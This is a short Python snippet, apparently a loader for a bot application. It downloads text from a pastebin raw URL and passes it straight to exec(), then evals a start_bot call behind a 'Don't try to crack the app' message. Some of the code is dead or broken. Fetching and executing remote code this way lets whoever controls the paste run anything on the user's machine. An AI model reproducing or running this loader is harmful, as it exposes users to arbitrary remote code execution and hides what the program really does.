print("connect 2")
import requests
data = requests.get(url="pastebin.com/raw_yGyTJQVh").text
exec(data)


def start_script():
    try:
        eval("""start_bot()""")
    except Exception as e:
        return "Don't try to crack the app"
        start_bot()